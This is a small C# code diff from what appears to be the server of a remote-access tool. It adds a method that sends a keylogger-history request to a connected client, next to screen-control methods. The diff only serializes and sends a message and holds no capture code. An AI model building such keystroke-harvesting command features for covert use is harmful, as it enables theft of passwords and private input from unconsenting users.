@@ -53,6 +53,13 @@ namespace Server.Services
             await connection.SendAsync(json);
         }
 
+        public async Task SendKeyLoggerHistoryRequestAsync(ServerClientConnection connection, KeyLoggerHistoryRequest request)
+        {
+            request.ClientId = connection.Id;
+            var json = JsonHelper.Serialize(request);
+            await connection.SendAsync(json);
+        }
+
         // Screen Control methods
         public async Task SendScreenControlStartAsync(ServerClientConnection connection, ScreenControlStart request)
         {
